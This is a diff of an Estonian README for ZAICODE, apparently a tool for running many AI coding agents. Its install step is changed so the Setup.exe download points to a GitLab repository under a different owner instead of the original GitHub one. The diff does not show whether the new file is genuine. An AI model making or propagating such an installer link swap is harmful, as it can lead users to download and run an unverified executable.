@@ -22,7 +22,7 @@ ZAICODE on operaatori tööpink, millega saab käitada korraga paljusid AI-koodi
 
 ## Paigalda ühe klikiga
 
-1. Laadi alla **[ZAICODE-Setup.exe](https://github.com/vacterro/zaicode/raw/master/install/ZAICODE-Setup.exe)**.
+1. Laadi alla **[ZAICODE-Setup.exe](https://gitlab.com/vacuum34/zaicode/-/raw/master/install/ZAICODE-Setup.exe)**.
 2. Topeltklõpsa sellel ja vajuta **INSTALL**.
 
 See on kõik. Paigaldaja toob masinale puuduvad osad (Git, Node.js, Python privaatsete
